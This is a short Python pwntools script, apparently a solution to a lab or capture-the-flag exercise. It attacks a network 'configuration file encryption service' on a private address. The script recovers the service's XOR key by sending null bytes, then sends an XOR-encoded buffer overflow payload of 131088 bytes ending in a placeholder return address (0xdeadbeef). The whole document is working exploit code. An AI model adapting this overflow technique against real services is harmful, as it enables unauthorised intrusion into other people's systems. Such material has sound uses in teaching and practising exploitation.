#!/usr/bin/python
from pwn import *
import struct
import re

# Sending the data
def send(data):
	s.send("E" + struct.pack("I", len(data)) + data)

# Xor the payload
def xor(plain, key, keySize):
	return ''.join(chr(ord(plain[x])^ord(key[x % keySize])) for x in range(len(plain)))


# Initialize the connection
s = remote("192.168.135.133", 20002)
s.recvuntil("[-- Enterprise configuration file encryption service --]")

# Getting the xorkey
keySize = 128 # (unsigned int) * 32 = 128
send("\x00"*keySize)

s.recvuntil("]")
s.recv(4) # Getting the size
key = s.recv(4096)[1:]


# Getting the overflow
size = 131088
payload =  "A"*size

payload += struct.pack("I", 0xdeadbeef)

payload = xor(payload, key, keySize)
send(payload)
s.recvuntil("]")



# Verifying the output
s.recv(4) # Getting the size
s.recv(4096) # Getting the encrypted file
s.sendline("Q") # Ending the script
s.recvall() # Ending the script